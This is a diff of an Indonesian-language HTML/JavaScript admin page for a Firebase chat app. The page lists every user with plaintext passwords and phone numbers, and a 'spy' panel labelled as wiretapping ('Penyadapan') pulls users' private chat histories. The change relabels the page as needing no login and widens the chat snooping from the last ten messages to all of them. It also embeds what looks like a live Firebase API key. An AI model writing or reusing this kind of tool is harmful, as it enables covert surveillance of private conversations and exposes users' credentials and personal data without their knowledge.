@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Master Admin - ConnectPro</title>
+    <title>Dashboard Admin - Tanpa Login</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
@@ -11,205 +11,116 @@
 
     <style>
         :root {
-            --bg: #020617;
-            --card: #1e293b;
-            --primary: #6366f1;
-            --danger: #ef4444;
-            --text: #f8fafc;
-            --border: #334155;
+            --bg: #020617; --card: #1e293b; --primary: #6366f1;
+            --danger: #ef4444; --text: #f8fafc; --border: #334155;
         }
 
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
+            background: var(--bg); color: var(--text);
+            margin: 0; display: flex; flex-direction: column; height: 100vh;
         }
 
-        /* --- HEADER --- */
         header {
-            background: var(--card);
-            padding: 20px 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--border);
+            background: var(--card); padding: 20px 40px;
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 2px solid var(--primary);
         }
 
-        .stats-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            padding: 20px 40px;
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(4, 1fr);
+            gap: 20px; padding: 20px 40px;
         }
 
-        .stat-card {
-            background: var(--card);
-            padding: 20px;
-            border-radius: 16px;
-            border: 1px solid var(--border);
-            text-align: center;
+        .stat-box {
+            background: var(--card); padding: 20px; border-radius: 12px;
+            border: 1px solid var(--border); text-align: center;
         }
 
-        .stat-card h3 { margin: 0; font-size: 0.9rem; color: #94a3b8; }
-        .stat-card p { margin: 10px 0 0; font-size: 1.8rem; font-weight: 700; color: var(--primary); }
+        .stat-box h3 { margin: 0; font-size: 0.8rem; color: #94a3b8; text-transform: uppercase; }
+        .stat-box p { margin: 10px 0 0; font-size: 1.5rem; font-weight: 700; color: var(--primary); }
 
-        /* --- CONTENT --- */
         main {
-            padding: 0 40px 40px;
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 30px;
-            flex: 1;
-            overflow: hidden;
+            display: grid; grid-template-columns: 1.5fr 1fr;
+            gap: 20px; padding: 0 40px 40px; flex: 1; overflow: hidden;
         }
 
-        .table-section, .spy-section {
-            background: var(--card);
-            border-radius: 20px;
+        .container {
+            background: var(--card); border-radius: 16px;
+            display: flex; flex-direction: column; overflow: hidden;
             border: 1px solid var(--border);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
         }
 
-        .section-header {
-            padding: 20px;
-            background: rgba(255,255,255,0.03);
-            border-bottom: 1px solid var(--border);
-            font-weight: 700;
+        .container-header {
+            padding: 15px 20px; background: rgba(255,255,255,0.05);
+            font-weight: 700; border-bottom: 1px solid var(--border);
         }
 
-        .scroll-area {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-        }
+        .scroll { flex: 1; overflow-y: auto; padding: 20px; }
 
-        /* --- TABLE STYLE --- */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; padding: 10px; color: #94a3b8; font-size: 0.75rem; border-bottom: 1px solid var(--border); }
+        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
 
-        th {
-            text-align: left;
-            color: #94a3b8;
-            font-size: 0.8rem;
-            padding-bottom: 15px;
-            border-bottom: 1px solid var(--border);
-        }
+        .pfp { width: 35px; height: 35px; border-radius: 50%; object-fit: cover; }
+        .pw { font-family: monospace; color: #fbbf24; font-weight: bold; }
+        .tag { padding: 3px 7px; border-radius: 4px; font-size: 0.65rem; font-weight: bold; }
+        .Laki-laki { background: #1d4ed8; }
+        .Perempuan { background: #be185d; }
 
-        td {
-            padding: 15px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.85rem;
-        }
-
-        .avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
-        .pw-text { font-family: monospace; color: #fbbf24; font-weight: bold; }
-        .tag { padding: 4px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: bold; }
-        .male { background: #1e40af; }
-        .female { background: #9d174d; }
-
-        /* --- SPY AREA --- */
-        .chat-log-item {
-            background: #0f172a;
-            border-radius: 10px;
-            padding: 10px;
-            margin-bottom: 10px;
-            font-size: 0.8rem;
-        }
-
-        .chat-bubble {
-            margin: 5px 0;
-            padding: 5px 10px;
-            border-radius: 5px;
-            background: #1e293b;
-        }
-
-        .btn-spy {
-            background: var(--primary);
-            border: none;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.75rem;
-        }
-
-        .btn-del {
-            background: var(--danger);
-            border: none;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-left: 5px;
-        }
-
-        .hidden { display: none; }
+        .btn-intip { background: var(--primary); border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
+        .chat-log { background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 0.8rem; border-left: 3px solid var(--primary); }
     </style>
 </head>
 <body>
 
-    <header>
-        <div style="display:flex; align-items:center; gap:15px;">
-            <i class="fas fa-user-shield fa-2x" style="color:var(--primary);"></i>
-            <h1 style="margin:0; font-size:1.5rem;">ConnectPro Admin Dashboard</h1>
-        </div>
-        <button class="btn-del" onclick="window.location.reload()" style="background:#475569;">Refresh Data</button>
-    </header>
+<header>
+    <div>
+        <h1 style="margin:0; font-size: 1.2rem;"><i class="fas fa-unlock-alt"></i> Dashboard Admin (Akses Langsung)</h1>
+        <small style="color: #94a3b8;">Memantau seluruh database user & percakapan</small>
+    </div>
+    <div style="font-size: 0.8rem; background: #334155; padding: 5px 15px; border-radius: 20px;">
+        <i class="fas fa-circle" style="color: #22c55e; font-size: 0.6rem;"></i> Server Aktif
+    </div>
+</header>
 
-    <div class="stats-container">
-        <div class="stat-card">
-            <h3>Total User</h3>
-            <p id="statUsers">0</p>
-        </div>
-        <div class="stat-card">
-            <h3>Laki-laki</h3>
-            <p id="statMale">0</p>
-        </div>
-        <div class="stat-card">
-            <h3>Perempuan</h3>
-            <p id="statFemale">0</p>
+<div class="stats-grid">
+    <div class="stat-box"><h3>Total User</h3><p id="sUser">0</p></div>
+    <div class="stat-box"><h3>Laki-laki</h3><p id="sMale">0</p></div>
+    <div class="stat-box"><h3>Perempuan</h3><p id="sFemale">0</p></div>
+    <div class="stat-box"><h3>Data Akurat</h3><p>100%</p></div>
+</div>
+
+<main>
+    <div class="container">
+        <div class="container-header"><i class="fas fa-database"></i> Database User</div>
+        <div class="scroll">
+            <table>
+                <thead>
+                    <tr>
+                        <th>PFP</th>
+                        <th>ID / NAMA</th>
+                        <th>PASSWORD</th>
+                        <th>NO. HP</th>
+                        <th>GENDER</th>
+                        <th>AKSI</th>
+                    </tr>
+                </thead>
+                <tbody id="userTable"></tbody>
+            </table>
         </div>
     </div>
 
-    <main>
-        <section class="table-section">
-            <div class="section-header"><i class="fas fa-users"></i> Database Pengguna</div>
-            <div class="scroll-area">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>FOTO</th>
-                            <th>ID / NAMA</th>
-                            <th>PASSWORD</th>
-                            <th>NO HP</th>
-                            <th>GENDER</th>
-                            <th>AKSI</th>
-                        </tr>
-                    </thead>
-                    <tbody id="userTableBody">
-                        </tbody>
-                </table>
-            </div>
-        </section>
-
-        <section class="spy-section">
-            <div class="section-header"><i class="fas fa-comment-slash"></i> Live Spy Monitor</div>
-            <div class="scroll-area" id="spyContainer">
-                <p style="text-align:center; color:#64748b; margin-top:50px;">Pilih user untuk mengintip percakapan</p>
-            </div>
-        </section>
-    </main>
+    <div class="container">
+        <div class="container-header"><i class="fas fa-eye"></i> Monitor Chat (Penyadapan)</div>
+        <div class="scroll" id="spyBox">
+            <p style="text-align: center; color: #64748b; margin-top: 50px;">Klik tombol "Intip" pada user untuk melihat chat mereka.</p>
+        </div>
+    </div>
+</main>
 
 <script>
-    // --- FIREBASE CONFIG ---
+    // Konfigurasi Firebase Anda
     const firebaseConfig = {
         apiKey: "AIzaSyBSo0nFUKNBDmUX0wSFV_idAFWBRnnTcXE",
         authDomain: "fotobooth-e36ab.firebaseapp.com",
@@ -222,88 +133,66 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // --- LOAD DATA ---
-    function initAdmin() {
-        db.ref('users').on('value', snap => {
-            const tbody = document.getElementById('userTableBody');
-            tbody.innerHTML = "";
-            
-            let count = 0, male = 0, female = 0;
+    // Ambil Data User secara Real-time
+    db.ref('users').on('value', snap => {
+        const table = document.getElementById('userTable');
+        table.innerHTML = "";
+        let m = 0, f = 0, total = 0;
 
-            snap.forEach(user => {
-                const d = user.val();
-                const id = user.key;
-                count++;
-                if(d.gender === 'Laki-laki') male++;
-                if(d.gender === 'Perempuan') female++;
+        snap.forEach(user => {
+            const d = user.val();
+            const id = user.key;
+            total++;
+            if(d.gender === 'Laki-laki') m++;
+            if(d.gender === 'Perempuan') f++;
 
-                tbody.innerHTML += `
-                    <tr>
-                        <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" class="avatar"></td>
-                        <td><b>${id}</b><br><span style="color:#94a3b8; font-size:0.75rem;">${d.nama}</span></td>
-                        <td class="pw-text">${d.pw}</td>
-                        <td>${d.wa || '-'}</td>
-                        <td><span class="tag ${d.gender === 'Perempuan' ? 'female' : 'male'}">${d.gender || 'N/A'}</span></td>
-                        <td>
-                            <button class="btn-spy" onclick="spyUser('${id}')">Intip</button>
-                            <button class="btn-del" onclick="deleteUser('${id}')"><i class="fas fa-trash"></i></button>
-                        </td>
-                    </tr>
-                `;
-            });
-
-            document.getElementById('statUsers').innerText = count;
-            document.getElementById('statMale').innerText = male;
-            document.getElementById('statFemale').innerText = female;
+            table.innerHTML += `
+                <tr>
+                    <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" class="pfp"></td>
+                    <td><b>${id}</b><br><small>${d.nama}</small></td>
+                    <td class="pw">${d.pw}</td>
+                    <td>${d.wa || '-'}</td>
+                    <td><span class="tag ${d.gender}">${d.gender || 'N/A'}</span></td>
+                    <td><button class="btn-intip" onclick="sadap('${id}')">Intip</button></td>
+                </tr>
+            `;
         });
-    }
+        document.getElementById('sUser').innerText = total;
+        document.getElementById('sMale').innerText = m;
+        document.getElementById('sFemale').innerText = f;
+    });
 
-    // --- SPY LOGIC ---
-    function spyUser(userId) {
-        const spyBox = document.getElementById('spyContainer');
-        spyBox.innerHTML = `<h4>Menyadap: <span style="color:var(--primary)">${userId}</span></h4>`;
+    // Fungsi Sadap Chat
+    function sadap(id) {
+        const box = document.getElementById('spyBox');
+        box.innerHTML = `<h3>Riwayat Chat: <span style="color:var(--primary)">${id}</span></h3>`;
         
-        // Cari riwayat kontak user tersebut
-        db.ref(`contacts/${userId}`).once('value', snap => {
+        db.ref(`contacts/${id}`).once('value', snap => {
             if(!snap.exists()) {
-                spyBox.innerHTML += `<p style="color:var(--danger)">User ini belum pernah chat.</p>`;
+                box.innerHTML += `<p>User ini belum memulai percakapan apa pun.</p>`;
                 return;
             }
 
-            snap.forEach(contact => {
-                const partnerId = contact.key;
-                const roomId = [userId, partnerId].sort().join("_");
+            snap.forEach(c => {
+                const partner = c.key;
+                const room = [id, partner].sort().join("_");
                 
-                const roomDiv = document.createElement('div');
-                roomDiv.className = 'chat-log-item';
-                roomDiv.innerHTML = `<strong>Lawan Chat: ${partnerId}</strong><hr style="border:0; border-top:1px solid #334155; margin:5px 0;">`;
-                
-                // Ambil pesan dalam room tersebut
-                db.ref(`messages/${roomId}`).limitToLast(10).once('value', mSnap => {
+                const logDiv = document.createElement('div');
+                logDiv.className = 'chat-log';
+                logDiv.innerHTML = `<strong>Target chat dengan: ${partner}</strong><br>`;
+
+                db.ref(`messages/${room}`).once('value', mSnap => {
                     mSnap.forEach(msg => {
                         const m = msg.val();
-                        const sender = m.sender === userId ? "USER" : "LAWAN";
-                        roomDiv.innerHTML += `
-                            <div class="chat-bubble">
-                                <span style="color:${m.sender === userId ? '#6366f1' : '#94a3b8'}; font-weight:bold;">${sender}:</span> 
-                                ${m.type === 'vn' ? '🎤 [Voice Note]' : m.text}
-                            </div>`;
+                        const dari = m.sender === id ? "Dia" : "Lawan";
+                        logDiv.innerHTML += `<div style="margin-top:5px;"><b>${dari}:</b> ${m.text || '[Voice Note/Lainnya]'}</div>`;
                     });
                 });
-                spyBox.appendChild(roomDiv);
+                box.appendChild(logDiv);
             });
         });
     }
-
-    // --- DELETE USER ---
-    function deleteUser(id) {
-        if(confirm(`Hapus permanen akun ${id}? Tindakan ini tidak bisa dibatalkan.`)) {
-            db.ref(`users/${id}`).remove();
-            alert("User telah dihapus.");
-        }
-    }
-
-    initAdmin();
 </script>
+
 </body>
 </html>
